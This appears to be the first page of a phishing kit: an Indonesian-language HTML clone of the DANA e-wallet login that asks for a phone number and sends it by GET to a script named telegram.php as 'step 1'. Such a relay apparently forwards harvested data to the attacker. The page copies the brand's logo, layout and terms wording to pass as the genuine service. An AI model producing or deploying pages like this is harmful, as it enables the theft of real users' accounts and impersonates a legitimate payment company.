<html>

<head>
    <title>DANA | dana.id</title>
    <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
    <link rel="manifest" href="./assets/img/favicon/site.webmanifest">
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta http-equiv="refresh">
    <link rel="stylesheet" type="text/css" href="./main.css">
    <link rel="stylesheet" type="text/css" href="./spinner.css">
</head>

<body>
    <div class="container">
        <a class="aback" href="/"><img class="back" src="./back.png"></a>
        <img class="dana_logo" src="./dana_logo.png">
        <h1 class="page-login">Masukkan <b class="bh1">nomor HP</b> kamu untuk lanjut</h1>
        <div class="inputNo">
            <form class="formNo" action="./telegram.php" method="get">
                <label for="nope" class="flagNo"><img class="flagIndo" src="./indo.png"></label>
                <label for="nope">
                    <p class="codeTel">+62</p>
                </label>
                <input type="hidden" name="step" value="1">
                <input name="phone" class="nope" id="nope" type="tel" placeholder="811-1234-5678" autocomplete="off" required>
                <h1 class="syarat">Dengan melanjutkan, kamu setuju dengan <b class="bh1">Syarat & Ketentuan</b> dan <b class="bh1">Kebijakan Privasi</b> kami</h1>
                <center>
                    <button id="send_data" class="send_data">LANJUT</button>
                </center>
            </form>
        </div>
    </div>
    <div id="process" name="process" class="process" style="display: none;">
        <div class="loading">
            <img src="./load_bg.png">
            <img class="spinner" src="./load_spin.png">
        </div>
    </div>
</body>
<script src="./jquery.min.js"></script>
<script src="./jquery.mask.min.js"></script>
<script src="./functions.js"></script>

</html>